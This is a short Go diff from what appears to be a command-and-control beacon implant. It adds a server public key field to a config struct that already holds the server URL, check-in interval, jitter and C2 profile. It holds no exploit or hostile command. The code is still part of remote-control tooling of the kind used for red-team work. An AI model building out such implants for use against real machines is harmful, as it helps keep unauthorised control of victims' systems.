@@ -12,10 +12,11 @@ import (
 var embeddedConfig []byte
 
 type BeaconConfig struct {
-	ServerURL string            `json:"server_url"`
-	Interval  int64             `json:"interval"`
-	Jitter    int64             `json:"jitter"`
-	C2Profile protocol.C2Profile `json:"c2_profile"`
+	ServerURL       string             `json:"server_url"`
+	Interval        int64              `json:"interval"`
+	Jitter          int64              `json:"jitter"`
+	ServerPublicKey string             `json:"server_public_key"`
+	C2Profile       protocol.C2Profile `json:"c2_profile"`
 }
 
 func Load() (*BeaconConfig, error) {
